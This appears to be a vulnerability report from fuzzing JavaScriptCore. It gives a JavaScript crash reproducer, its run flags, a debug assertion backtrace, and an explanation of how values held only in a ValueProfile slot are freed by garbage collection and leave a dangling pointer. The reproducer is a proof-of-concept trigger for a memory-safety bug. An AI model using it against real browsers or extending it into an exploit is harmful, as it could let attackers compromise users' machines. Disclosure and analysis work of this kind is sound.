
While fuzzing JSC, I encountered the following JS program which crashes JSC from current HEAD and release (/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc):

	// Run with  --useConcurrentJIT=false --thresholdForJITAfterWarmUp=10

	function fullGC() {
		for (var i = 0; i < 10; i++) {
			new Float64Array(0x1000000);
		}
	}

	function v62() {
		function v141() {
			try {
				const v146 = v141();
			} catch(v147) {
				const v154 = Object();
				function v155(v156,v157,v158) {
					try {
						// This typed array gets collected
						// but is still referenced from the
						// value profile of TypedArray.values
						const v167 = new Uint32Array();
						const v171 = v167.values();
					} catch(v177) {
					}
				}
				const v181 = v155();
			}
		}

		v141();

		function edenGC() {
			for (let v194 = 0; v194 < 100; v194++) {
				const v204 = new Float64Array(0x10000);
			}
		}
		const v205 = edenGC();
	}

	for (let i = 0; i < 6; i++) {
		const v209 = v62();
	}

	fullGC();

If the loop that calls v62 is run 100 instead of 6 times it will also crash without --thresholdForJITAfterWarmUp=10, albeit a bit less reliable.

Running this sample will crash JSC in debug builds with an assertion like this:

	ASSERTION FAILED: structureIndex < m_capacity
	Source/JavaScriptCore/runtime/StructureIDTable.h(175) : JSC::Structure *JSC::StructureIDTable::get(JSC::StructureID)
	1   0x101aadcf9 WTFCrash
	2   0x101aadd19 WTFCrashWithSecurityImplication
	3   0x10000cb18 JSC::StructureIDTable::get(unsigned int)
	4   0x10000ca23 JSC::VM::getStructure(unsigned int)
	5   0x10000c7cf JSC::JSCell::structure(JSC::VM&) const
	6   0x10001887b JSC::JSCell::structure() const
	7   0x10072fc05 JSC::speculationFromCell(JSC::JSCell*)
	8   0x10072fd9f JSC::speculationFromValue(JSC::JSValue)
	9   0x1006963dc JSC::ValueProfileBase<1u>::computeUpdatedPrediction(JSC::ConcurrentJSLocker const&)
    ...



A ValueProfile is implemented by the ValueProfileBase C++ struct:

    struct ValueProfileBase {

        ...
        int m_bytecodeOffset; // -1 for prologue
        unsigned m_numberOfSamplesInPrediction { 0 };


        EncodedJSValue m_buckets[totalNumberOfBuckets];
    };


This raises the question how the JSValues in m_buckets are kept alive during GC, as they are not stored in a MarkedArgumentBuffer [4] or similar (which automatically inform the GC of the objects and thus keep them alive). The answer is that they are in fact not kept alive during GC by the ValueProfiles themselves. Instead, computeUpdatedPrediction [3] is invoked from finalizeUnconditionally [5] at the end of the GC marking phase and will clear the m_buckets array before the pointers might become dangling. Basically, it works like this:

* Eventually, GC kicks in and starts its marking phase in which it visits all reachable objects and marks them as alive
* Afterwards, before sweeping, the GC invokes various callbacks (called "unconditionalFinalizers") [6] on certain objects (e.g. CodeBlocks)
* The CodeBlock finalizers update all value profiles, which in turn causes their current speculated type to be merged with the runtime values that were observed since the last update
* Afterwards, all entries in the m_buckets array of the ValueProfiles are cleared to zero [7]. As such, the ValueProfiles no longer store any pointers to JSObjects
* Finally, the sweeping phase runs and frees all JSCells that have not been marked




The infinite recursion and following stack overflow exceptions in this sample might be necessary to force a situation in which the newly allocated Uint32Array is only stored into a profiling slot and nowhere else. But maybe they are also simply required to cause the right sequence of GC invocations.

